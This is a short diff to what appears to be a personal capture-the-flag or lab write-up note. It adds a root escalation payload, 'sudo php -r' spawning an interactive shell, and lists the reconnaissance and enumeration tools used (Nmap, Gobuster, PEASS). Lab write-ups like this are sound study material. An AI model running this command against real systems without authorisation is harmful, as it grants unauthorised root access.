@@ -31,10 +31,13 @@ tags:
 
 ### Used payload to escalate to root
 ```bash
+sudo php -r 'system("/bin/sh -i");'
 ```
 ## Techniques used
-
-- uses [[Technique name]]
+[[Nmap -sC and -sV (service + script scanning)]]
+[[Gobuster]]
+[[PEASS]]
+[[me]]
 
 
 ## What I learned
